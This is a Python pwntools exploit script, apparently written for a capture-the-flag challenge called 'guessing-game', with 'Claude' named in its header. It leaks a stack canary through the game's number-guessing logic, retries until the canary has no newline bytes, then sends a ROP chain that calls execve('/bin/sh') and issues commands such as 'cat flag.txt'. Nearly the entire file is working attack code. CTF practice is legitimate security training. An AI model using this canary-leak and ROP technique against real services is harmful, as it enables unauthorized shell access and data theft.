#!/usr/bin/env python3
"""
Author: Claude
Purpose: Retry exploit until we get a canary without bad bytes (0x0a, 0x0d)
Created: 2025-11-09
Updated: 2025-11-09 - Added retry logic for bad bytes in canary
Updated: 2025-11-09 - Fixed /bin/sh address (0x404060 not 0x403060) via Ghidra
Expected Result: Get shell when canary has no bad bytes
Produced Result: TBD
"""

from pwn import *

# Configuration
REMOTE = True
HOST = 'guessing-game.challs.pwnoh.io'
PORT = 1337
MAX_RETRIES = 50

# Addresses
POP_RAX = 0x40124f
POP_RDI = 0x40124d
POP_RSI = 0x401251
POP_RDX = 0x401253
SYSCALL = 0x401255
BIN_SH = 0x404060  # Corrected address from Ghidra analysis
RET = 0x40124e

context.log_level = 'info'
context.arch = 'amd64'

def connect():
    if REMOTE:
        return remote(HOST, PORT, ssl=True)
    else:
        return process('./guessing_game')

def binary_search(io, max_val):
    """Binary search to find the target number"""
    low, high = 0, max_val
    guesses = 0

    while low <= high:
        mid = (low + high) // 2
        guesses += 1

        io.recvuntil(b'Enter a guess:')
        io.sendline(str(mid).encode())
        response = io.recvline().decode()

        if "got it" in response.lower():
            return mid
        elif "Too low" in response:
            low = mid + 1
        elif "Too high" in response:
            high = mid - 1
        elif "Better luck" in response:
            return None

    return None

def has_bad_bytes(data):
    """Check if data contains bad bytes for gets()"""
    bad_bytes = [0x0a, 0x0d, 0x00]  # newline, carriage return, null
    for byte in data:
        if byte in bad_bytes[:-1]:  # Allow 0x00 at the end
            return True
    return False

def leak_canary(io):
    """Leak canary using large max value"""
    max_val = (1 << 56) - 1

    io.recvuntil(b'Enter a max number:')
    io.sendline(str(max_val).encode())

    seed = binary_search(io, max_val)
    if seed is None:
        return None

    canary = (seed << 8)
    return canary

def exploit():
    for attempt in range(MAX_RETRIES):
        io = connect()

        # Leak canary
        canary = leak_canary(io)
        if not canary:
            io.close()
            continue

        # Check for bad bytes (excluding the final 0x00)
        canary_bytes = p64(canary)
        if has_bad_bytes(canary_bytes[:-1]):  # Check all except last byte
            log.warning(f"Attempt {attempt + 1}: Bad canary {hex(canary)} - contains 0x0a or 0x0d, retrying...")
            io.close()
            continue

        log.success(f"Attempt {attempt + 1}: Good canary found: {hex(canary)}")

        # Build ROP chain
        io.recvuntil(b'Enter your name for the leaderboard:')

        rop = flat([
            b'A' * 10,              # Fill buffer
            p64(canary),             # Canary (no bad bytes!)
            b'B' * 8,                # Saved RBP
            p64(RET),                # Stack alignment
            p64(POP_RAX), 59,        # rax = execve
            p64(POP_RSI), 0,         # rsi = 0
            p64(POP_RDX), 0,         # rdx = 0
            p64(POP_RDI), BIN_SH,    # rdi = "/bin/sh"
            p64(SYSCALL)             # execve syscall
        ])

        log.info(f"Sending payload ({len(rop)} bytes)...")
        io.sendline(rop)

        sleep(0.5)

        try:
            # Check for output
            response = io.recv(timeout=1)
            log.info(f"Response: {response.decode(errors='ignore')}")

            if b"stack smashing" in response:
                log.error("Stack smashing detected - canary was wrong!")
                io.close()
                continue

            # Try to interact
            log.info("Attempting to send commands...")
            io.sendline(b'cat flag.txt')
            io.sendline(b'ls -la')
            io.sendline(b'echo PWNED')

            output = io.recvrepeat(timeout=3)
            log.info("Output:")
            print(output.decode(errors='ignore'))

            if b'bctf{' in output or b'HTB{' in output or b'PWNED' in output:
                log.success("Got shell output!")
                io.interactive()
                return

        except Exception as e:
            log.error(f"Error: {e}")
        finally:
            io.close()

    log.error(f"Failed after {MAX_RETRIES} attempts")

if __name__ == "__main__":
    exploit()
